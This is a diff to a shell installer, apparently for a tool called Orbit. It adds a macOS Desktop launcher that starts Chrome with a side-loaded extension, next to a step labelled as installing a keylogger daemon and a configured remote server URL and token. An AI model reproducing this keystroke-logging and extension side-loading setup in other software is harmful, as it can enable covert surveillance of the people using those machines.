@@ -101,6 +101,22 @@ fi
 export ORBIT_SERVER_URL="$REMOTE"
 export ORBIT_TOKEN=$(python3 -c "import json; print(json.load(open('$CONFIG')).get('token',''))" 2>/dev/null || echo "")
 
+# Chrome 확장 자동 등록
+EXT_PATH="$DIR/chrome-extension"
+if [ -f "$EXT_PATH/manifest.json" ]; then
+  if [[ "$OSTYPE" == "darwin"* ]]; then
+    # macOS: Chrome alias 생성
+    CHROME="/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
+    if [ -f "$CHROME" ]; then
+      cat > "$HOME/Desktop/Chrome+Orbit.command" << CMDEOF
+#!/bin/bash
+"$CHROME" --load-extension="$EXT_PATH" &
+CMDEOF
+      chmod +x "$HOME/Desktop/Chrome+Orbit.command"
+    fi
+  fi
+fi
+
 # ── [5/6] 키로거 데몬 ──
 echo -e "\n${CYAN}[5/6] 키로거 데몬 설치...${NC}"
 DAEMON="$DIR/daemon/personal-agent.js"
